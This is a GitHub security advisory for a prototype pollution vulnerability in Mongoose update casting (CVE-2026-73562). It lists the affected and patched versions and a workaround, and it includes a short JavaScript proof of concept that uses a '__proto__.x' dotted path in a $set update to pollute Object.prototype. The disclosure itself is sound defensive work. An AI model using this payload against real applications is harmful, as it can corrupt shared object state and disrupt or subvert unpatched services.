# [M] Mongoose: Prototype pollution in mongoose update casting via __proto__-prefixed dotted path (Schema._getSchema/path getter)

## Summary
Severity: Medium
Advisory: GHSA-664h-wqgq-64gw
CVE: CVE-2026-73562
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-664h-wqgq-64gw
Type: github-advisory

## Affected
- npm: `mongoose` — affected >=0 <6.13.10
- npm: `mongoose` — affected >=7.0.0 <7.8.10
- npm: `mongoose` — affected >=8.0.0 <8.24.1
- npm: `mongoose` — affected >=9.0.0 <9.7.2

## Details
### Impact
_What kind of vulnerability is it? Who is impacted?_

Prototype pollution in update casting: passing a user-controlled update to a Mongoose update, like `MyModel.updateOne(filter, req.body)`, can cause Mongoose to set `$fullPath` and `$parentSchemaDocArray` on `Object.prototype`.

Example:

```javascript
const mongoose = require('mongoose');
console.log('before:', Object.prototype.$fullPath);            // undefined

const User = mongoose.model('User', new mongoose.Schema({ name: String }));
const malicious = JSON.parse('{"$set": {"__proto__.x": "anything"}}');   // attacker-controlled update

const q = User.updateOne({}, {});
try { q._castUpdate(malicious); } catch (e) { /* throws AFTER the pollution side-effect */ }

console.log('after :', Object.prototype.$fullPath);            // "__proto__"
console.log('enumerable:', Object.prototype.propertyIsEnumerable('$fullPath'));  // true
console.log('fresh {}:', ({}).$fullPath);                      // "__proto__"
```

### Patches
_Has the problem been patched? What versions should users upgrade to?_

9.7.2, 8.24.1. 7.8.10, 6.13.10

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

Check user-controlled updates for own `__proto__` properties before passing to Mongoose

### References
_Are there any links users can visit to find out more?_

## References
- https://github.com/Automattic/mongoose/security/advisories/GHSA-664h-wqgq-64gw
- https://github.com/Automattic/mongoose/pull/16230
- https://github.com/Automattic/mongoose/commit/f494b8430f9097fc70446d6949c8a42a27518e0b
- https://github.com/Automattic/mongoose
- https://github.com/Automattic/mongoose/releases/tag/6.13.10
- https://github.com/Automattic/mongoose/releases/tag/7.8.10
- https://github.com/Automattic/mongoose/releases/tag/8.24.1
- https://github.com/Automattic/mongoose/releases/tag/9.7.2
